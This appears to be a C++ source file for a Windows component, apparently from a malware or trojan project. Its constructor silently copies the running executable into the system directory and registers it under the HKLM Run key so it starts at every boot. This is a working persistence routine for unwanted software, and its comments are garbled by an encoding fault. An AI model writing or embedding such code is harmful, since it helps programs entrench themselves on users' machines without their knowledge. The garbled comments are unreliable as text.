#include "stdafx.h"
#include "RegisterHEKY.h"


RegisterHEKY::RegisterHEKY()
{
	wchar_t system[MAX_PATH];			//ϵͳĿ¼·��
	wchar_t pathtofile[MAX_PATH];		//Ҫ�������е��ļ�������·��
	HMODULE GetModH = GetModuleHandle(NULL);		//�õ���ǰִ���ļ���ȫ·��
	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
	//�õ�ϵͳ�ļ�����Ŀ¼��·��
	GetSystemDirectory(system, sizeof(system));
	//�γ�Ҫ���Ƶ���ȫ·��
	wcscat(system, TARGETFILE);
	//���Ҹ��Ƶ�Ŀ��·��
	CopyFile(pathtofile, system, false);
	//д��ע����Ա㿪���Զ�����
	HKEY hKey;
	//��ע���:·������
	//HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	//����һ��ֵ,������������,ֵΪҪ�������е��ļ�������·��
	long ret = RegSetValueEx(hKey, TARGETFKEY, 0, REG_SZ, (const unsigned char*)system, sizeof(system));

	//�ر�ע���:
	RegCloseKey(hKey);
	/*���Լ�����������*/
}


RegisterHEKY::~RegisterHEKY()
{
}
